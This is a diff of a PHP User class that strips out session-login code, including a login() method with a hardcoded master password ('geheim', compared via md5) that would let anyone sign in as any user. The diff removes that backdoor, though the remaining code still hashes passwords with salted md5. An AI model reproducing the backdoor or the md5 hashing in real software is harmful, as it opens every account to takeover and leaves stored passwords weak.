@@ -1,9 +1,8 @@
 <?php
+
 require_once 'Record.php';
 
 class User implements Record {
-
-    private static $current; // user currently logged in
 
     const LEVEL_NONE = 0; // not logged in
     const LEVEL_USER = 1;
@@ -33,15 +32,6 @@ class User implements Record {
         return $this->name;
     }
 
-    static function loginFromSession() {
-        if (isset($_SESSION['user'])) {
-            $email = $_SESSION['user'];
-            User::$current = User::get($email);
-        } else {
-            User::$current = null;
-        }
-    }
-
     function getName(): string {
         return $this->name;
     }
@@ -58,21 +48,8 @@ class User implements Record {
         $this->passwordHash = md5($this->salt . $password);
     }
 
-    function login(string $password): bool {
-        $backdoor = md5('geheim');
-        $ok = md5($this->salt . $password) == $this->passwordHash || md5($password) == $backdoor;
-        if ($ok) {
-            User::$current = $this;
-            $_SESSION['user'] = $this->email;
-        } else {
-            User::$current = null;
-            unset($_SESSION['user']);
-        }
-        return $ok;
-    }
-
-    static function getCurrent(): ?User {
-        return User::$current;
+    function checkPassword(string $password) {
+        return md5($this->salt . $password) == $this->passwordHash;
     }
 
     static function get(string $email): ?User {
@@ -117,5 +94,3 @@ class User implements Record {
     }
 
 }
-
-User::loginFromSession();
